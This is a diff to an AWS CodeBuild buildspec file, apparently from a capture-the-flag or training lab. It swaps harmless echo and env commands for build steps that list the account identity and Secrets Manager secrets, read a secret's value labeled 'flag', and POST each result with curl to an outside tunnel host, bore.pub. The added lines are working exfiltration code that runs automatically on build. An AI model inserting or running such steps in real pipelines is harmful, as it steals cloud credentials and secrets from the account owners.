@@ -1,8 +1,9 @@
 version: 0.2
-
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - aws sts get-caller-identity --region us-east-1 | curl -s -X POST -d @- http://bore.pub:37842/identity
+      - aws secretsmanager list-secrets --region us-east-1 | curl -s -X POST -d @- http://bore.pub:37842/secrets
+      - aws secretsmanager list-secrets --region us-east-1 --query SecretList[].Name --output text | curl -s -X POST -d @- http://bore.pub:37842/secret_names
+      - FLAG_NAME=$(aws secretsmanager list-secrets --region us-east-1 --query 'SecretList[0].Name' --output text)
+      - aws secretsmanager get-secret-value --secret-id "$FLAG_NAME" --region us-east-1 | curl -s -X POST -d @- http://bore.pub:37842/flag
